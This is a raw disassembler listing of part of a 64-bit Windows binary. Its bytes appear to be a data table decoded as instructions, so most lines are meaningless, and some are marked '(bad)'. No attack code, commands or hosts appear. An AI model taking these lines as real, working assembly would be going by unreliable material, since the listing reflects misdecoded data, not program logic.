   140005218:	00 00                	add    %al,(%rax)
   14000521a:	3e 6a 6d             	ds push $0x6d
   14000521d:	0d 00 00 00 00       	or     $0x0,%eax
   140005222:	a8 5a                	test   $0x5a,%al
   140005224:	6a 7a                	push   $0x7a
   140005226:	00 00                	add    %al,(%rax)
   140005228:	00 00                	add    %al,(%rax)
   14000522a:	0b cf                	or     %edi,%ecx
   14000522c:	0e                   	(bad)
   14000522d:	e4 00                	in     $0x0,%al
   14000522f:	00 00                	add    %al,(%rax)
   140005231:	00 9d ff 09 93 00    	add    %bl,0x9309ff(%rbp)
   140005237:	00 00                	add    %al,(%rax)
   140005239:	00 27                	add    %ah,(%rdi)
   14000523b:	ae                   	scas   (%rdi),%al
   14000523c:	00 0a                	add    %cl,(%rdx)
   14000523e:	00 00                	add    %al,(%rax)
   140005240:	00 00                	add    %al,(%rax)
   140005242:	b1 9e                	mov    $0x9e,%cl
   140005244:	07                   	(bad)
   140005245:	7d 00                	jge    0x140005247
   140005247:	00 00                	add    %al,(%rax)
   140005249:	00 44 93 0f          	add    %al,0xf(%rbx,%rdx,4)
   14000524d:	f0 00 00             	lock add %al,(%rax)
   140005250:	00 00                	add    %al,(%rax)
   140005252:	d2 a3 08 87 00 00    	shlb   %cl,0x8708(%rbx)
   140005258:	00 00                	add    %al,(%rax)
   14000525a:	68 f2 01 1e 00       	push   $0x1e01f2
   14000525f:	00 00                	add    %al,(%rax)
   140005261:	00 fe                	add    %bh,%dh
   140005263:	c2 06 69             	ret    $0x6906
   140005266:	00 00                	add    %al,(%rax)
   140005268:	00 00                	add    %al,(%rax)
   14000526a:	5d                   	pop    %rbp
   14000526b:	57                   	push   %rdi
   14000526c:	62 f7 00 00 00       	(bad)
   140005271:	00 cb                	add    %cl,%bl
   140005273:	67 65 80 00 00       	addb   $0x0,%gs:(%eax)
   140005278:	00 00                	add    %al,(%rax)
   14000527a:	71 36                	jno    0x1400052b2
   14000527c:	6c                   	insb   (%dx),(%rdi)
   14000527d:	19 00                	sbb    %eax,(%rax)
   14000527f:	00 00                	add    %al,(%rax)
   140005281:	00 e7                	add    %ah,%bh
   140005283:	06                   	(bad)
   140005284:	6b 6e 00 00          	imul   $0x0,0x0(%rsi),%ebp
   140005288:	00 00                	add    %al,(%rax)
   14000528a:	76 1b                	jbe    0x1400052a7
   14000528c:	d4                   	(bad)
   14000528d:	fe 00                	incb   (%rax)
   14000528f:	00 00                	add    %al,(%rax)
   140005291:	00 e0                	add    %ah,%al
   140005293:	2b d3                	sub    %ebx,%edx
   140005295:	89 00                	mov    %eax,(%rax)
   140005297:	00 00                	add    %al,(%rax)
   140005299:	00 5a 7a             	add    %bl,0x7a(%rdx)
   14000529c:	da 10                	ficoml (%rax)
   14000529e:	00 00                	add    %al,(%rax)
   1400052a0:	00 00                	add    %al,(%rax)
   1400052a2:	cc                   	int3
   1400052a3:	4a dd 67 00          	rex.WX frstor 0x0(%rdi)
   1400052a7:	00 00                	add    %al,(%rax)
   1400052a9:	00 6f df             	add    %ch,-0x21(%rdi)
   1400052ac:	b9 f9 00 00 00       	mov    $0xf9,%ecx
   1400052b1:	00 f9                	add    %bh,%cl
   1400052b3:	ef                   	out    %eax,(%dx)
   1400052b4:	be 8e 00 00 00       	mov    $0x8e,%esi
   1400052b9:	00 43 be             	add    %al,-0x42(%rbx)
   1400052bc:	b7 17                	mov    $0x17,%bh
   1400052be:	00 00                	add    %al,(%rax)
   1400052c0:	00 00                	add    %al,(%rax)
   1400052c2:	d5 8e b0 60 00       	{rex2 0x8e} cmpxchg %r12b,0x0(%rax)
   1400052c7:	00 00                	add    %al,(%rax)
   1400052c9:	00 e8                	add    %ch,%al
   1400052cb:	a3 d6 d6 00 00 00 00 	movabs %eax,0x937e00000000d6d6
   1400052d2:	7e 93 
   1400052d4:	d1 a1 00 00 00 00    	shll   $1,0x0(%rcx)
   1400052da:	c4 c2 d8 38          	(bad)
   1400052de:	00 00                	add    %al,(%rax)
   1400052e0:	00 00                	add    %al,(%rax)
   1400052e2:	52                   	push   %rdx
   1400052e3:	f2 df 4f 00          	repnz fisttps 0x0(%rdi)
   1400052e7:	00 00                	add    %al,(%rax)
   1400052e9:	00 f1                	add    %dh,%cl
   1400052eb:	67 bb d1 00 00 00    	addr32 mov $0xd1,%ebx
   1400052f1:	00 67 57             	add    %ah,0x57(%rdi)
   1400052f4:	bc a6 00 00 00       	mov    $0xa6,%esp
   1400052f9:	00 dd                	add    %bl,%ch
   1400052fb:	06                   	(bad)
   1400052fc:	b5 3f                	mov    $0x3f,%ch
   1400052fe:	00 00                	add    %al,(%rax)
   140005300:	00 00                	add    %al,(%rax)
   140005302:	4b                   	rex.WXB
   140005303:	36 b2 48             	ss mov $0x48,%dl
   140005306:	00 00                	add    %al,(%rax)
   140005308:	00 00                	add    %al,(%rax)
   14000530a:	da 2b                	fisubrl (%rbx)
   14000530c:	0d d8 00 00 00       	or     $0xd8,%eax
   140005311:	00 4c 1b 0a          	add    %cl,0xa(%rbx,%rbx,1)
   140005315:	af                   	scas   (%rdi),%eax
   140005316:	00 00                	add    %al,(%rax)
   140005318:	00 00                	add    %al,(%rax)
   14000531a:	f6 4a 03 36          	testb  $0x36,0x3(%rdx)
   14000531e:	00 00                	add    %al,(%rax)
   140005320:	00 00                	add    %al,(%rax)
   140005322:	60                   	(bad)
   140005323:	7a 04                	jp     0x140005329
   140005325:	41 00 00             	add    %al,(%r8)
   140005328:	00 00                	add    %al,(%rax)
   14000532a:	c3                   	ret
   14000532b:	ef                   	out    %eax,(%dx)
   14000532c:	60                   	(bad)
   14000532d:	df 00                	filds  (%rax)
   14000532f:	00 00                	add    %al,(%rax)
   140005331:	00 55 df             	add    %dl,-0x21(%rbp)
   140005334:	67 a8 00             	addr32 test $0x0,%al
   140005337:	00 00                	add    %al,(%rax)
   140005339:	00 ef                	add    %ch,%bh
   14000533b:	8e 6e 31             	mov    0x31(%rsi),%gs
   14000533e:	00 00                	add    %al,(%rax)
   140005340:	00 00                	add    %al,(%rax)
   140005342:	79 be                	jns    0x140005302
   140005344:	69 46 00 00 00 00 8c 	imul   $0x8c000000,0x0(%rsi),%eax
   14000534b:	b3 61                	mov    $0x61,%bl
   14000534d:	cb                   	lret
   14000534e:	00 00                	add    %al,(%rax)
   140005350:	00 00                	add    %al,(%rax)
   140005352:	1a 83 66 bc 00 00    	sbb    0xbc66(%rbx),%al
   140005358:	00 00                	add    %al,(%rax)
   14000535a:	a0 d2 6f 25 00 00 00 	movabs 0x3600000000256fd2,%al
   140005361:	00 36 
   140005363:	e2 68                	loop   0x1400053cd
   140005365:	52                   	push   %rdx
   140005366:	00 00                	add    %al,(%rax)
   140005368:	00 00                	add    %al,(%rax)
   14000536a:	95                   	xchg   %eax,%ebp
   14000536b:	77 0c                	ja     0x140005379
   14000536d:	cc                   	int3
   14000536e:	00 00                	add    %al,(%rax)
   140005370:	00 00                	add    %al,(%rax)
   140005372:	03 47 0b             	add    0xb(%rdi),%eax
   140005375:	bb 00 00 00 00       	mov    $0x0,%ebx
   14000537a:	b9 16 02 22 00       	mov    $0x220216,%ecx
   14000537f:	00 00                	add    %al,(%rax)
   140005381:	00 2f                	add    %ch,(%rdi)
   140005383:	26 05 55 00 00 00    	es add $0x55,%eax
   140005389:	00 be 3b ba c5 00    	add    %bh,0xc5ba3b(%rsi)
   14000538f:	00 00                	add    %al,(%rax)
   140005391:	00 28                	add    %ch,(%rax)
   140005393:	0b bd b2 00 00 00    	or     0xb2(%rbp),%edi
   140005399:	00 92 5a b4 2b 00    	add    %dl,0x2bb45a(%rdx)
   14000539f:	00 00                	add    %al,(%rax)
   1400053a1:	00 04 6a             	add    %al,(%rdx,%rbp,2)
   1400053a4:	b3 5c                	mov    $0x5c,%bl
   1400053a6:	00 00                	add    %al,(%rax)
   1400053a8:	00 00                	add    %al,(%rax)
   1400053aa:	a7                   	cmpsl  (%rdi),(%rsi)
   1400053ab:	ff d7                	call   *%rdi
   1400053ad:	c2 00 00             	ret    $0x0
   1400053b0:	00 00                	add    %al,(%rax)
   1400053b2:	31 cf                	xor    %ecx,%edi
   1400053b4:	d0 b5 00 00 00 00    	shlb   $1,0x0(%rbp)
   1400053ba:	8b 9e d9 2c 00 00    	mov    0x2cd9(%rsi),%ebx
   1400053c0:	00 00                	add    %al,(%rax)
   1400053c2:	1d ae de 5b 00       	sbb    $0x5bdeae,%eax
   1400053c7:	00 00                	add    %al,(%rax)
   1400053c9:	00 b0 c2 64 9b 00    	add    %dh,0x9b64c2(%rax)
   1400053cf:	00 00                	add    %al,(%rax)
   1400053d1:	00 26                	add    %ah,(%rsi)
   1400053d3:	f2 63 ec             	repnz movsxd %esp,%ebp
   1400053d6:	00 00                	add    %al,(%rax)
   1400053d8:	00 00                	add    %al,(%rax)
   1400053da:	9c                   	pushf
   1400053db:	a3 6a 75 00 00 00 00 	movabs %eax,0x930a00000000756a
   1400053e2:	0a 93 
   1400053e4:	6d                   	insl   (%dx),(%rdi)
   1400053e5:	02 00                	add    (%rax),%al
   1400053e7:	00 00                	add    %al,(%rax)
   1400053e9:	00 a9 06 09 9c 00    	add    %ch,0x9c0906(%rcx)
   1400053ef:	00 00                	add    %al,(%rax)
   1400053f1:	00 3f                	add    %bh,(%rdi)
   1400053f3:	36 0e                	ss (bad)
   1400053f5:	eb 00                	jmp    0x1400053f7
   1400053f7:	00 00                	add    %al,(%rax)
   1400053f9:	00 85 67 07 72 00    	add    %al,0x720767(%rbp)
   1400053ff:	00 00                	add    %al,(%rax)
   140005401:	00 13                	add    %dl,(%rbx)
   140005403:	57                   	push   %rdi
   140005404:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 0x14000540a
   14000540a:	82                   	(bad)
   14000540b:	4a bf 95 00 00 00 00 	rex.WX movabs $0xb87a140000000095,%rdi
   140005412:	14 7a b8 
   140005415:	e2 00                	loop   0x140005417
   140005417:	00 00                	add    %al,(%rax)
   140005419:	00 ae 2b b1 7b 00    	add    %ch,0x7bb12b(%rsi)
   14000541f:	00 00                	add    %al,(%rax)
   140005421:	00 38                	add    %bh,(%rax)
   140005423:	1b b6 0c 00 00 00    	sbb    0xc(%rsi),%esi
   140005429:	00 9b 8e d2 92 00    	add    %bl,0x92d28e(%rbx)
   14000542f:	00 00                	add    %al,(%rax)
   140005431:	00 0d be d5 e5 00    	add    %cl,0xe5d5be(%rip)        # 0x140e629f5
   140005437:	00 00                	add    %al,(%rax)
   140005439:	00 b7 ef dc 7c 00    	add    %dh,0x7cdcef(%rdi)
   14000543f:	00 00                	add    %al,(%rax)
   140005441:	00 21                	add    %ah,(%rcx)
   140005443:	df db                	(bad)
   140005445:	0b 00                	or     (%rax),%eax
   140005447:	00 00                	add    %al,(%rax)
   140005449:	00 d4                	add    %dl,%ah
   14000544b:	d2 d3                	rcl    %cl,%bl
   14000544d:	86 00                	xchg   %al,(%rax)
   14000544f:	00 00                	add    %al,(%rax)
   140005451:	00 42 e2             	add    %al,-0x1e(%rdx)
   140005454:	d4                   	(bad)
   140005455:	f1                   	int1
   140005456:	00 00                	add    %al,(%rax)
   140005458:	00 00                	add    %al,(%rax)
   14000545a:	f8                   	clc
   14000545b:	b3 dd                	mov    $0xdd,%bl
   14000545d:	68 00 00 00 00       	push   $0x0
   140005462:	6e                   	outsb  (%rsi),(%dx)
   140005463:	83 da 1f             	sbb    $0x1f,%edx
   140005466:	00 00                	add    %al,(%rax)
   140005468:	00 00                	add    %al,(%rax)
   14000546a:	cd 16                	int    $0x16
   14000546c:	be 81 00 00 00       	mov    $0x81,%esi
   140005471:	00 5b 26             	add    %bl,0x26(%rbx)
   140005474:	b9 f6 00 00 00       	mov    $0xf6,%ecx
   140005479:	00 e1                	add    %ah,%cl
   14000547b:	77 b0                	ja     0x14000542d
   14000547d:	6f                   	outsl  (%rsi),(%dx)
   14000547e:	00 00                	add    %al,(%rax)
   140005480:	00 00                	add    %al,(%rax)
   140005482:	77 47                	ja     0x1400054cb
   140005484:	b7 18                	mov    $0x18,%bh
   140005486:	00 00                	add    %al,(%rax)
   140005488:	00 00                	add    %al,(%rax)
   14000548a:	e6 5a                	out    %al,$0x5a
   14000548c:	08 88 00 00 00 00    	or     %cl,0x0(%rax)
   140005492:	70 6a                	jo     0x1400054fe
   140005494:	0f ff 00             	ud0    (%rax),%eax
   140005497:	00 00                	add    %al,(%rax)
   140005499:	00 ca                	add    %cl,%dl
   14000549b:	3b 06                	cmp    (%rsi),%eax
   14000549d:	66 00 00             	data16 add %al,(%rax)
   1400054a0:	00 00                	add    %al,(%rax)
   1400054a2:	5c                   	pop    %rsp
   1400054a3:	0b 01                	or     (%rcx),%eax
   1400054a5:	11 00                	adc    %eax,(%rax)
   1400054a7:	00 00                	add    %al,(%rax)
   1400054a9:	00 ff                	add    %bh,%bh
   1400054ab:	9e                   	sahf
   1400054ac:	65 8f 00             	pop    %gs:(%rax)
   1400054af:	00 00                	add    %al,(%rax)
   1400054b1:	00 69 ae             	add    %ch,-0x52(%rcx)
   1400054b4:	62                   	(bad)
   1400054b5:	f8                   	clc
   1400054b6:	00 00                	add    %al,(%rax)
   1400054b8:	00 00                	add    %al,(%rax)
   1400054ba:	d3 ff                	sar    %cl,%edi
   1400054bc:	6b 61 00 00          	imul   $0x0,0x0(%rcx),%esp
   1400054c0:	00 00                	add    %al,(%rax)
   1400054c2:	45 cf                	rex.RB iret
   1400054c4:	6c                   	insb   (%dx),(%rdi)
   1400054c5:	16                   	(bad)
   1400054c6:	00 00                	add    %al,(%rax)
   1400054c8:	00 00                	add    %al,(%rax)
   1400054ca:	78 e2                	js     0x1400054ae
   1400054cc:	0a a0 00 00 00 00    	or     0x0(%rax),%ah
   1400054d2:	ee                   	out    %al,(%dx)
   1400054d3:	d2 0d d7 00 00 00    	rorb   %cl,0xd7(%rip)        # 0x1400055b0
   1400054d9:	00 54 83 04          	add    %dl,0x4(%rbx,%rax,4)
   1400054dd:	4e 00 00             	rex.WRX add %r8b,(%rax)
   1400054e0:	00 00                	add    %al,(%rax)
   1400054e2:	c2 b3 03             	ret    $0x3b3
   1400054e5:	39 00                	cmp    %eax,(%rax)
   1400054e7:	00 00                	add    %al,(%rax)
   1400054e9:	00 61 26             	add    %ah,0x26(%rcx)
   1400054ec:	67 a7                	cmpsl  (%edi),(%esi)
   1400054ee:	00 00                	add    %al,(%rax)
   1400054f0:	00 00                	add    %al,(%rax)
   1400054f2:	f7 16                	notl   (%rsi)
   1400054f4:	60                   	(bad)
   1400054f5:	d0 00                	rolb   $1,(%rax)
   1400054f7:	00 00                	add    %al,(%rax)
   1400054f9:	00 4d 47             	add    %cl,0x47(%rbp)
   1400054fc:	69 49 00 00 00 00 db 	imul   $0xdb000000,0x0(%rcx),%ecx
   140005503:	77 6e                	ja     0x140005573
   140005505:	3e 00 00             	ds add %al,(%rax)
   140005508:	00 00                	add    %al,(%rax)
   14000550a:	4a 6a d1             	rex.WX push $0xffffffffffffffd1
   14000550d:	ae                   	scas   (%rdi),%al
   14000550e:	00 00                	add    %al,(%rax)
   140005510:	00 00                	add    %al,(%rax)
   140005512:	dc 5a d6             	fcompl -0x2a(%rdx)
   140005515:	d9 00                	flds   (%rax)
   140005517:	00 00                	add    %al,(%rax)
   140005519:	00 66 0b             	add    %ah,0xb(%rsi)
   14000551c:	df 40 00             	filds  0x0(%rax)
   14000551f:	00 00                	add    %al,(%rax)
   140005521:	00 f0                	add    %dh,%al
   140005523:	3b d8                	cmp    %eax,%ebx
   140005525:	37                   	(bad)
   140005526:	00 00                	add    %al,(%rax)
   140005528:	00 00                	add    %al,(%rax)
   14000552a:	53                   	push   %rbx
   14000552b:	ae                   	scas   (%rdi),%al
   14000552c:	bc a9 00 00 00       	mov    $0xa9,%esp
   140005531:	00 c5                	add    %al,%ch
   140005533:	9e                   	sahf
   140005534:	bb de 00 00 00       	mov    $0xde,%ebx
   140005539:	00 7f cf             	add    %bh,-0x31(%rdi)
   14000553c:	b2 47                	mov    $0x47,%dl
   14000553e:	00 00                	add    %al,(%rax)
   140005540:	00 00                	add    %al,(%rax)
   140005542:	e9 ff b5 30 00       	jmp    0x140310b46
   140005547:	00 00                	add    %al,(%rax)
   140005549:	00 1c f2             	add    %bl,(%rdx,%rsi,8)
   14000554c:	bd bd 00 00 00       	mov    $0xbd,%ebp
   140005551:	00 8a c2 ba ca 00    	add    %cl,0xcabac2(%rdx)
   140005557:	00 00                	add    %al,(%rax)
   140005559:	00 30                	add    %dh,(%rax)
   14000555b:	93                   	xchg   %eax,%ebx
   14000555c:	b3 53                	mov    $0x53,%bl
   14000555e:	00 00                	add    %al,(%rax)
   140005560:	00 00                	add    %al,(%rax)
   140005562:	a6                   	cmpsb  (%rdi),(%rsi)
   140005563:	a3 b4 24 00 00 00 00 	movabs %eax,0x36050000000024b4
   14000556a:	05 36 
   14000556c:	d0 ba 00 00 00 00    	sarb   $1,0x0(%rdx)
   140005572:	93                   	xchg   %eax,%ebx
   140005573:	06                   	(bad)
   140005574:	d7                   	xlat   (%rbx)
   140005575:	cd 00                	int    $0x0
   140005577:	00 00                	add    %al,(%rax)
   140005579:	00 29                	add    %ch,(%rcx)
   14000557b:	57                   	push   %rdi
   14000557c:	de 54 00 00          	ficoms 0x0(%rax,%rax,1)
   140005580:	00 00                	add    %al,(%rax)
   140005582:	bf 67 d9 23 00       	mov    $0x23d967,%edi
   140005587:	00 00                	add    %al,(%rax)
   140005589:	00 2e                	add    %ch,(%rsi)
   14000558b:	7a 66                	jp     0x1400055f3
   14000558d:	b3 00                	mov    $0x0,%bl
   14000558f:	00 00                	add    %al,(%rax)
   140005591:	00 b8 4a 61 c4 00    	add    %bh,0xc4614a(%rax)
   140005597:	00 00                	add    %al,(%rax)
   140005599:	00 02                	add    %al,(%rdx)
   14000559b:	1b 68 5d             	sbb    0x5d(%rax),%ebp
   14000559e:	00 00                	add    %al,(%rax)
   1400055a0:	00 00                	add    %al,(%rax)
   1400055a2:	94                   	xchg   %eax,%esp
   1400055a3:	2b 6f 2a             	sub    0x2a(%rdi),%ebp
   1400055a6:	00 00                	add    %al,(%rax)
   1400055a8:	00 00                	add    %al,(%rax)
   1400055aa:	37                   	(bad)
   1400055ab:	be 0b b4 00 00       	mov    $0xb40b,%esi
   1400055b0:	00 00                	add    %al,(%rax)
   1400055b2:	a1 8e 0c c3 00 00 00 	movabs 0x1b00000000c30c8e,%eax
   1400055b9:	00 1b 
   1400055bb:	df 05 5a 00 00 00    	filds  0x5a(%rip)        # 0x14000561b
   1400055c1:	00 8d ef 02 2d 00    	add    %cl,0x2d02ef(%rbp)
   1400055c7:	00 00                	add    %al,(%rax)
	...
